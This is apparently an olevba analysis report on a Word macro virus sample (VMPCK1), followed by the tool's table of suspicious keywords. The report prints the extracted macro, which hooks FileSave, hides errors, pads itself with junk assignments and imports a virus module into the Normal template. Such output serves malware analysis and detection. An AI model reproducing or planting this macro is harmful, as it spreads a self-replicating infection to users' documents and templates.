olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPCK1-abe5263b155edc3a2aa2d5d44e627ecff659ec67
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.VMPCK1-abe5263b155edc3a2aa2d5d44e627ecff659ec67 
in file: Virus.MSWord.VMPCK1-abe5263b155edc3a2aa2d5d44e627ecff659ec67 - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FileSave()
DkHjFoFq = DhIv4080 & RmBx14271
OxPv15243 = JySiQxBr & HpUq9362 & NoKlGoJt & NoUn9649
DnGhPlCz = HrHp17923 & OvKm18343
On Error Resume Next
OxPv15243 = JySiQxBr & HpUq9362 & NoKlGoJt & NoUn9649
DnGhPlCz = HrHp17923 & OvKm18343
If NormalTemplate.VBProject.VBComponents.Item("virus").Name <> "virus" Then
OxPv15243 = JySiQxBr & HpUq9362 & NoKlGoJt & NoUn9649
DnGhPlCz = HrHp17923 & OvKm18343
NormalTemplate.VBProject.VBComponents.Import "c:\windows\system\WD1_.DRV"
End If
OxPv15243 = JySiQxBr & HpUq9362 & NoKlGoJt & NoUn9649
DnGhPlCz = HrHp17923 & OvKm18343
ActiveDocument.Save
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

